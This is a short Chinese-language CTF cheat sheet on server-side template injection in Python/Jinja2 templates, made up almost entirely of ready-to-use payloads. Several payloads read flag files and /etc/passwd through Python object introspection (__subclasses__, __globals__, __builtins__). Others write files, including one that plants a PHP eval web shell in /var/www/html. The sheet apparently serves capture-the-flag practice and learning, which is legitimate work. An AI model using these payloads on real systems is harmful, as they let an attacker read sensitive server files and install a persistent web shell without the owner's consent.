# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSTI.md
# TITLE: SSTI（服务器端模板注入）
# CATEGORY: web

# 方法1: FileLoader (索引40, 常见)
{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}}

# 方法2: 通过 __builtins__.open
{{url_for.__globals__['__builtins__']['open']('flag').read()}}
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}

# 方法3: 通过 file (Python 2)
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()}}

# 方法4: 文件写
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php @eval($_POST[1]);?>')}}
{{().__class__.__bases__[0].__subclasses__()[40]('/tmp/shell','w').write('content')}}
